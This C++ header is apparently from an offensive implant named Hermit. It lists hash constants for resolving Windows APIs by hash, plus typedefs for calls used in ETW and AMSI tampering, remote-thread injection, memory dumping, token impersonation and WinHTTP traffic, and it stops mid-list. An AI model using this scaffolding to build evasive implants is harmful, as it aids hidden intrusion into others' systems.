#ifndef HERMIT_CORE_PROCS_HPP
#define HERMIT_CORE_PROCS_HPP

#include "core/macros.hpp"
#include "core/nt.hpp"
#include "core/stdout.hpp"
#include "core/syscalls.hpp"
#include "core/utils.hpp"
#include "core/win32.hpp"

#include <windows.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <string>
#include <strsafe.h>
#include <sysinfoapi.h>

// They're used for calculating module/func hashes.
#define HASH_IV                                 0x35
#define RANDOM_ADDR                             0xab10f29f

// Generated by script/calc_hash_func.py
#define HASH_FUNC_ETWEVENTWRITE                 0xaa1b5078
#define HASH_FUNC_LDRLOADDLL                    0x19cb5e59
#define HASH_FUNC_NTADJUSTPRIVILEGESTOKEN       0x1b79f58d
#define HASH_FUNC_NTALLOCATEVIRTUALMEMORY       0xf8829394
#define HASH_FUNC_NTCLOSE                       0x6f18e5dd
#define HASH_FUNC_NTCREATEFILE                  0x2f4d94d3
#define HASH_FUNC_NTCREATENAMEDPIPEFILE         0x333974ac
#define HASH_FUNC_NTCREATEPROCESSEX             0xbd003d8b
#define HASH_FUNC_NTCREATETHREADEX              0x2afc9934
#define HASH_FUNC_NTDELETEFILE                  0xcd2f2302
#define HASH_FUNC_NTDUPLICATEOBJECT             0xae23334f
#define HASH_FUNC_NTENUMERATEVALUEKEY           0xa153b717
#define HASH_FUNC_NTFLUSHINSTRUCTIONCACHE       0x3a43951d
#define HASH_FUNC_NTFREEVIRTUALMEMORY           0xb6eb4645
#define HASH_FUNC_NTGETCONTEXTTHREAD            0x904d345e
#define HASH_FUNC_NTOPENFILE                    0x740aa9e1
#define HASH_FUNC_NTOPENKEYEX                   0x16b3e52d
#define HASH_FUNC_NTOPENPROCESS                 0x64e24f6a
#define HASH_FUNC_NTOPENPROCESSTOKEN            0xcdd9f7af
#define HASH_FUNC_NTOPENTHREAD                  0xa58f60af
#define HASH_FUNC_NTPRIVILEGECHECK              0x73129112
#define HASH_FUNC_NTPROTECTVIRTUALMEMORY        0xa7df2bd8
#define HASH_FUNC_NTQUERYINFORMATIONFILE        0x6226c85b
#define HASH_FUNC_NTQUERYINFORMATIONPROCESS     0xa79c59b0
#define HASH_FUNC_NTQUERYINFORMATIONTOKEN       0x8a713c7a
#define HASH_FUNC_NTQUERYKEY                    0x43da72
#define HASH_FUNC_NTQUERYSYSTEMINFORMATION      0x1bfabb50
#define HASH_FUNC_NTREADFILE                    0xc363b2ad
#define HASH_FUNC_NTREADVIRTUALMEMORY           0x88bc3b5b
#define HASH_FUNC_NTRESUMETHREAD                0x8bad8d92
#define HASH_FUNC_NTSETCONTEXTTHREAD            0x25df9cd2
#define HASH_FUNC_NTSETINFORMATIONFILE          0x52a8041
#define HASH_FUNC_NTSETINFORMATIONPROCESS       0xb5d02d0a
#define HASH_FUNC_NTSYSTEMDEBUGCONTROL          0x4def6394
#define HASH_FUNC_NTTERMINATEPROCESS            0xc58a7b49
#define HASH_FUNC_NTTRACEEVENT                  0xaea11c90
#define HASH_FUNC_NTUNMAPVIEWOFSECTION          0x574e9fc1
#define HASH_FUNC_NTWAITFORSINGLEOBJECT         0x73c87a00
#define HASH_FUNC_NTWRITEFILE                   0x9339e2e0
#define HASH_FUNC_NTWRITEVIRTUALMEMORY          0x7c61e008

#define HASH_FUNC_RTLALLOCATEHEAP               0xcc7755e
#define HASH_FUNC_RTLEXPANDENVIRONMENTSTRINGS   0xb73f443e
#define HASH_FUNC_RTLGETCURRENTDIRECTORY_U      0x4a121ccb
#define HASH_FUNC_RTLGETFULLPATHNAME_U          0x2116c216
#define HASH_FUNC_RTLINITUNICODESTRING          0x4dc9caa9
#define HASH_FUNC_RTLQUERYSYSTEMINFORMATION     0xf6044a6a
#define HASH_FUNC_RTLSETCURRENTDIRECTORY_U      0x4cd546d7
#define HASH_FUNC_RTLSTRINGCCHCATW              0x2deef223
#define HASH_FUNC_RTLSTRINGCCHCOPYW             0x32231e60
#define HASH_FUNC_RTLSTRINGCCHLENGTHW           0x28821d8f
#define HASH_FUNC_RTLZEROMEMORY                 0x899c0d1e

#define HASH_FUNC_ADJUSTTOKENPRIVILEGES         0x667f28f7
#define HASH_FUNC_AMSISCANBUFFER                0xb2f48854
#define HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER  0x34507089
#define HASH_FUNC_BCRYPTDECRYPT                 0x8f0ca18c
#define HASH_FUNC_BCRYPTDESTROYKEY              0xb3e3d126
#define HASH_FUNC_BCRYPTENCRYPT                 0x603fcbe4
#define HASH_FUNC_BCRYPTGENERATESYMMETRICKEY    0x37f3fd1e
#define HASH_FUNC_BCRYPTGETPROPERTY             0x227e23ca
#define HASH_FUNC_BCRYPTOPENALGORITHMPROVIDER   0xecd54615
#define HASH_FUNC_BCRYPTSETPROPERTY             0xadd558d6
#define HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT    0x478dd921
#define HASH_FUNC_CLOSEHANDLE                   0x47bdd9cb
#define HASH_FUNC_CREATEFILEW                   0x9dca9eca
#define HASH_FUNC_CREATEPIPE                    0xfee438df
#define HASH_FUNC_CREATEPROCESSW                0x78f4d6f9
#define HASH_FUNC_CREATEPROCESSWITHLOGONW       0x6e6511b8
#define HASH_FUNC_CREATEPROCESSWITHTOKENW       0x624476a2
#define HASH_FUNC_CREATEREMOTETHREADEX          0xdc857934
#define HASH_FUNC_CREATETHREADPOOLWAIT          0x7a8370ac
#define HASH_FUNC_CREATEWINDOWEXW               0xf05a61e3
#define HASH_FUNC_CRYPTBINARYTOSTRINGW          0x3bb09cf1
#define HASH_FUNC_CRYPTSTRINGTOBINARYW          0x6ff96cf1
#define HASH_FUNC_DELETEFILEW                   0x2d3a5bfb
#define HASH_FUNC_DISPATCHMESSAGE               0x1667a8b8
#define HASH_FUNC_DLLMAIN                       0xe2e2f348
#define HASH_FUNC_DUPLICATETOKENEX              0x8fa20256
#define HASH_FUNC_EXPANDENVIRONMENTSTRINGSW     0x30ae5619
#define HASH_FUNC_FINDCLOSE                     0xbfb52d8a
#define HASH_FUNC_FINDFIRSTFILEW                0x8b7ad5b9
#define HASH_FUNC_FINDNEXTFILEW                 0x9a714aba
#define HASH_FUNC_FORMATMESSAGE                 0x73e1db
#define HASH_FUNC_FREEENVIRONMENTSTRINGSW       0xebf072c7
#define HASH_FUNC_FREELIBRARY                   0x26174ba
#define HASH_FUNC_GETADAPTERSADDRESSES          0xc7179a9d
#define HASH_FUNC_GETCOMPUTERNAMEW              0x75f9dd70
#define HASH_FUNC_GETCOMPUTERNAMEEXW            0xc154e2bd
#define HASH_FUNC_GETENVIRONMENTSTRINGSW        0x6f39aea7
#define HASH_FUNC_GETEXITCODEPROCESS            0xd3934823
#define HASH_FUNC_GETFOREGROUNDWINDOW           0x41b94f14
#define HASH_FUNC_GETLASTERROR                  0xf03e69b1
#define HASH_FUNC_GETLOCALTIME                  0xdb736df7
#define HASH_FUNC_GETMESSAGE                    0xb704bce6
#define HASH_FUNC_GETMODULEFILENAMEW            0x9896e0e3
#define HASH_FUNC_GETMODULEHANDLEA              0xbf3b40ac
#define HASH_FUNC_GETPROCADDRESS                0xafa3e09d
#define HASH_FUNC_GETPROCESSHEAP                0xf3b49f5a
#define HASH_FUNC_GETPROCESSIMAGEFILENAMEW      0x92662ae3
#define HASH_FUNC_GETSYSTEMDIRECTORYW           0x7115fb1a
#define HASH_FUNC_GETSYSTEMINFO                 0x109fc03e
#define HASH_FUNC_GETSYSTEMMETRICS              0xc45b24b3
#define HASH_FUNC_GETSYSTEMTIME                 0x3498cb5d
#define HASH_FUNC_GETTCPTABLE                   0x7f7271ee
#define HASH_FUNC_GETTICKCOUNT                  0x18335d91
#define HASH_FUNC_GETTOKENINFORMATION           0x98171074
#define HASH_FUNC_GETUSERNAMEW                  0x6f996540
#define HASH_FUNC_GETVERSIONEXW                 0xd4a6794d
#define HASH_FUNC_GLOBALALLOC                   0x25c2f9dd
#define HASH_FUNC_GLOBALFREE                    0xcf0cfc4
#define HASH_FUNC_HEAPALLOC                     0x4cb68674
#define HASH_FUNC_HEAPFREE                      0x2b04aacd
#define HASH_FUNC_IMPERSONATELOGGEDONUSER       0x3333ce10
#define HASH_FUNC_ISDEBUGGERPRESENT             0xef4ed1b
#define HASH_FUNC_LOADACCELERATORSW             0x8d581ef4
#define HASH_FUNC_LOADCURSORW                   0xc5332f86
#define HASH_FUNC_LOADICONW                     0x42d0af83
#define HASH_FUNC_LOADLIBRARYA                  0x7069f241
#define HASH_FUNC_LOADLIBRARYW                  0x7069f257
#define HASH_FUNC_LOCALALLOC                    0xa505c69f
#define HASH_FUNC_LOCALFREE                     0x50d0ddc2
#define HASH_FUNC_LOOKUPPRIVILEGENAMEW          0x559348ea
#define HASH_FUNC_LOOKUPPRIVILEGEVALUEW         0x6e9aab88
#define HASH_FUNC_MESSAGEBOXA                   0xcc4a1d08
#define HASH_FUNC_MESSAGEBOXW                   0xcc4a1d1e
#define HASH_FUNC_MINIDUMPWRITEDUMP             0x46115a93
#define HASH_FUNC_MOVEFILEW                     0x1831dbd5
#define HASH_FUNC_NETAPIBUFFERFREE              0xd2840f3e
#define HASH_FUNC_NETLOCALGROUPENUM             0x8823503d
#define HASH_FUNC_NETUSERADD                    0xb89f30e
#define HASH_FUNC_NETUSERDEL                    0xa20de1f8
#define HASH_FUNC_NETUSERENUM                   0x7a5df1b4
#define HASH_FUNC_OPENPROCESS                   0xc9e08d0
#define HASH_FUNC_OPENPROCESSTOKEN              0x7d474909
#define HASH_FUNC_PRIVILEGECHECK                0x8e9032ec
#define HASH_FUNC_QUERYFULLPROCESSIMAGENAMEW    0xa6e1683e
#define HASH_FUNC_READFILE                      0x9a3e0607
#define HASH_FUNC_READPROCESSMEMORY             0xb29e4a5
#define HASH_FUNC_REGCLOSEKEY                   0x2fd69f86
#define HASH_FUNC_REGCREATEKEYEXW               0x8d1b9d00
#define HASH_FUNC_REGENUMKEYEXW                 0x1118d05
#define HASH_FUNC_REGENUMVALUEW                 0x21798766
#define HASH_FUNC_REGISTERCLASSEXW              0xab97084
#define HASH_FUNC_REGOPENKEYEXW                 0xab1b58e
#define HASH_FUNC_REGQUERYINFOKEYW              0x5b0be62f
#define HASH_FUNC_REGSAVEKEYW                   0xd68c94b4
#define HASH_FUNC_REGSETVALUEEXW                0x9dbfac36
#define HASH_FUNC_REMOVEDIRECTORYW              0x41880283
#define HASH_FUNC_REVERTTOSELF                  0x6c5291c0
#define HASH_FUNC_RTLADDFUNCTIONTABLE           0xbe7f92ca
#define HASH_FUNC_RTLCOPYMEMORY                 0xfd82b9ab
#define HASH_FUNC_SETFILEINFORMATIONBYHANDLE    0xbfea4fe2
#define HASH_FUNC_SETHANDLEINFORMATION          0x59694f77
#define HASH_FUNC_SETTHREADCONTEXT              0xa2f98d8
#define HASH_FUNC_SETTHREADPOOLWAIT             0x5f2a3808
#define HASH_FUNC_SHELLEXECUTEEXW               0x6c42582a
#define HASH_FUNC_SHOWWINDOW                    0x6f98b62
#define HASH_FUNC_SYSTEMTIMETOFILETIME          0xef278e15
#define HASH_FUNC_TERMINATEPROCESS              0x74f7cca3
#define HASH_FUNC_TRANSLATEACCELERATORW         0xecb91305
#define HASH_FUNC_TRANSLATEMESSAGE              0xf1acceae
#define HASH_FUNC_UPDATEWINDOW                  0x401c176e
#define HASH_FUNC_VIRTUALALLOC                  0x5ae0dabf
#define HASH_FUNC_VIRTUALALLOCEX                0x104fd152
#define HASH_FUNC_VIRTUALFREE                   0x640675a2
#define HASH_FUNC_VIRTUALPROTECT                0x927857d9
#define HASH_FUNC_VIRTUALPROTECTEX              0x7ac4edec
#define HASH_FUNC_WINHTTPCLOSEHANDLE            0x22081731
#define HASH_FUNC_WINHTTPCONNECT                0xe18b30db
#define HASH_FUNC_WINHTTPOPEN                   0x97451379
#define HASH_FUNC_WINHTTPOPENREQUEST            0xd6cffcd6
#define HASH_FUNC_WINHTTPQUERYDATAAVAILABLE     0xff301fc6
#define HASH_FUNC_WINHTTPQUERYHEADERS           0xe17c65cd
#define HASH_FUNC_WINHTTPREADDATA               0x70389c8f
#define HASH_FUNC_WINHTTPRECEIVERESPONSE        0x66131eb5
#define HASH_FUNC_WINHTTPSENDREQUEST            0x79792358
#define HASH_FUNC_WINHTTPSETOPTION              0x48ed79a8
#define HASH_FUNC_WINHTTPWRITEDATA              0xeed55fda
#define HASH_FUNC_WRITEPROCESSMEMORY            0x9ea48f46
#define HASH_FUNC_WSACLEANUP                    0xd1b44ef4
#define HASH_FUNC_WSASTARTUP                    0xa548e84d

namespace Procs
{
    // **NATIVE APIs**

    // EdwEventWrite
    typedef NTSTATUS (NTAPI* LPPROC_ETWEVENTWRITE)(Nt::REGHANDLE RegHandle, Nt::PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, Nt::PEVENT_DATA_DESCRIPTOR UserData);
    // LdrLoadDll
    typedef NTSTATUS (NTAPI* LPPROC_LDRLOADDLL)(PWSTR DllPath, PULONG DllCharacteristics, Nt::PUNICODE_STRING DllName, PVOID *DllHandle);
    // NtAdjustPrivilegesToken
    typedef NTSTATUS (NTAPI* LPPROC_NTADJUSTPRIVILEGESTOKEN)(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, ULONG BufferLength, PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
    // NtAllocateVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTALLOCATEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    // NtClose
	typedef NTSTATUS (NTAPI* LPPROC_NTCLOSE)(HANDLE Handle);
    // NtCreateFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEFILE)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
    // NtCreateNamedPipeFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATENAMEDPIPEFILE)(PHANDLE FileHandle, ULONG DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout);
    // NtCreateProcessEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEPROCESSEX)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle, ULONG Reserved);
    // NtCreateThreadEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, Nt::PPS_ATTRIBUTE_LIST AttributeList);
    // NtDeleteFile
    typedef NTSTATUS (NTAPI* LPPROC_NTDELETEFILE)(Nt::POBJECT_ATTRIBUTES ObjectAttributes);
    // NtDuplicateObject
    typedef NTSTATUS (NTAPI* LPPROC_NTDUPLICATEOBJECT)(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
    // NtGetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTGETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtEnumerateValueKey
    typedef NTSTATUS (NTAPI* LPPROC_NTENUMERATEVALUEKEY)(HANDLE KeyHandle, ULONG Index, Nt::KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
    // NtFlushInstructionCache
    typedef NTSTATUS (NTAPI* LPPROC_NTFLUSHINSTRUCTIONCACHE)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
    // NtFreeVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTFREEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    // NtOpenFile
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENFILE)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
    // NtOpenProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, Nt::PCLIENT_ID ClientId);
    // NtOpenProcessToken
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESSTOKEN)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
    // NtOpenKeyEx
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENKEYEX)(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, Nt::POBJECT_ATTRIBUTES ObjectAttributes, ULONG OpenOptions);
    // NtPrivilegeCheck
    typedef NTSTATUS (NTAPI* LPPROC_NTPRIVILEGECHECK)(HANDLE ClientToken, PPRIVILEGE_SET RequiredPrivileges, PBOOLEAN Result);
    // NtProtectVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTPROTECTVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    // NtQueryInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONFILE)(HANDLE FileHandle, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, Nt::FILE_INFORMATION_CLASS FileInformationClass);
    // NtQueryInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, Nt::PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    // NtQueryInformationToken
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONTOKEN)(HANDLE HandleToken, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
    // NtQueryKey
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYKEY)(HANDLE KeyHandle, Nt::KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
    // NtQuerySystemInformation
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYSYSTEMINFORMATION)(Nt::SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    // NtReadFile
    typedef NTSTATUS (NTAPI* LPPROC_NTREADFILE)(HANDLE FileHandle, HANDLE Event, Nt::PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtReadVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTREADVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
    // NtResumeThread
    typedef NTSTATUS (NTAPI* LPPROC_NTRESUMETHREAD)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    // NtSetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTSETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtSetInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONFILE)(HANDLE FileHandle, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, Nt::FILE_INFORMATION_CLASS FileInformationClass);
    // NtSetInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONPROCESS)(HANDLE ProcessHandle, Nt::PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
    // NtSystemDebugControl
    typedef NTSTATUS (NTAPI* LPPROC_NTSYSTEMDEBUGCONTROL)(Nt::SYSDBG_COMMAND Command, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnLength);
    // NtTerminateProcess
	typedef NTSTATUS (NTAPI* LPPROC_NTTERMINATEPROCESS)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
    // NtTraceEvent
    typedef NTSTATUS (NTAPI* LPPROC_NTTRACEEVENT)(HANDLE TraceHandle, ULONG Flags, ULONG FieldSize, PVOID Fields);
    // NtUnmapViewOfSection
    typedef NTSTATUS (NTAPI* LPPROC_NTUNMAPVIEWOFSECTION)(HANDLE ProcessHandle, PVOID BaseAddress);
    // NtWaitForSingleObject
    typedef NTSTATUS (NTAPI* LPPROC_NTWAITFORSINGLEOBJECT)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    // NtWriteFile
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEFILE)(HANDLE FileHandle, HANDLE Event, Nt::PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, Nt::PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtWriteVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    // RtlAllocateHeap
    typedef PVOID (NTAPI* LPPROC_RTLALLOCATEHEAP)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    // RtlExpandEnvironmentStrings
    typedef NTSTATUS (NTAPI* LPPROC_RTLEXPANDENVIRONMENTSTRINGS)(PVOID Environment, PCWSTR Source, SIZE_T SourceLength, PWSTR Destination, SIZE_T DestinationLength, PSIZE_T ReturnLength);
    // RtlGetCurrentDirectory_U
    typedef ULONG (NTAPI* LPPROC_RTLGETCURRENTDIRECTORY_U)(ULONG BufferLength, PWSTR Buffer);
    // RtlGetFullPathName_U
    typedef NTSTATUS (NTAPI* LPPROC_RTLGETFULLPATHNAME_U)(PCWSTR FileName, ULONG BufferLength, PWSTR Buffer, PWSTR *FilePart);
    // RtlInitUnicodeString
    typedef NTSTATUS (NTAPI* LPPROC_RTLINITUNICODESTRING)(Nt::PUNICODE_STRING DestinationString, PCWSTR SourceString);
    // RtlQuerySystemInformation
    typedef NTSTATUS (NTAPI* LPPROC_RTLQUERYSYSTEMINFORMATION)(Nt::SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    // RtlSetCurrentDirectory_U
    typedef NTSTATUS (NTAPI* LPPROC_RTLSETCURRENTDIRECTORY_U)(Nt::PUNICODE_STRING PathName);
    // RtlStringCchCatW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCATW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchCopyW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCOPYW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchLengthW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHLENGTHW)(PCWSTR psz, SIZE_T cchMax, SIZE_T *pcchLength);
    // RtlZeroMemory
    typedef VOID (NTAPI* LPPROC_RTLZEROMEMORY)(PVOID Destination, SIZE_T Length);
    
    // **WINAPI**

    // AdjustTokenPrivileges
    typedef BOOL (WINAPI* LPPROC_ADJUSTTOKENPRIVILEGES)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
    // AmsiScanBuffer
    typedef HRESULT (WINAPI* LPPROC_AMSISCANBUFFER)(Win32::HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, Win32::HAMSISESSION amsiSession, Win32::AMSI_RESULT *result);
    // BCryptCloseAlgorithmProvider
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
    // BCryptDecrypt
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTDECRYPT)(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
    // BCryptDestroyKey
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTDESTROYKEY)(BCRYPT_KEY_HANDLE hKey);
    // BCryptEncrypt
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTENCRYPT)(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
    // BCryptGenerateSymmetricKey
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE *phKey, PUCHAR pbKeyObject, ULONG cbKeyObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
    // BCryptGetProperty
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTGETPROPERTY)(BCRYPT_HANDLE hObject, LPCWSTR pszProperty, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
    // BCryptOpenAlgorithmProvider
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
    // BCryptSetProperty
    typedef NTSTATUS (WINAPI* LPPROC_BCRYPTSETPROPERTY)(BCRYPT_HANDLE hObject, LPCWSTR pszProperty, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
    // CheckRemoteDebuggerPresent
    typedef BOOL (WINAPI* LPPROC_CHECKREMOTEDEBUGGERPRESENT)(HANDLE hProcess, PBOOL pbDebuggerPresent);
    // CloseHandle
    typedef BOOL (WINAPI* LPPROC_CLOSEHANDLE)(HANDLE hObject);
    // CreateFileW
    typedef HANDLE (WINAPI* LPPROC_CREATEFILEW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
    // CreatePipe
    typedef BOOL (WINAPI* LPPROC_CREATEPIPE)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
    // CreateProcessW
    typedef BOOL (WINAPI* LPPROC_CREATEPROCESSW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    // CreateProcessWithLogonW
    typedef BOOL (WINAPI* LPPROC_CREATEPROCESSWITHLOGONW)(LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    // CreateProcessWithTokenW
    typedef BOOL (WINAPI* LPPROC_CREATEPROCESSWITHTOKENW)(HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    // CreateRemoteThreadEx
    typedef HANDLE (WINAPI* LPPROC_CREATEREMOTETHREADEX)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, LPDWORD lpThreadId);
    // CreateWindowExW
    typedef HWND (WINAPI* LPPROC_CREATEWINDOWEXW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
    // CryptBinaryToStringW
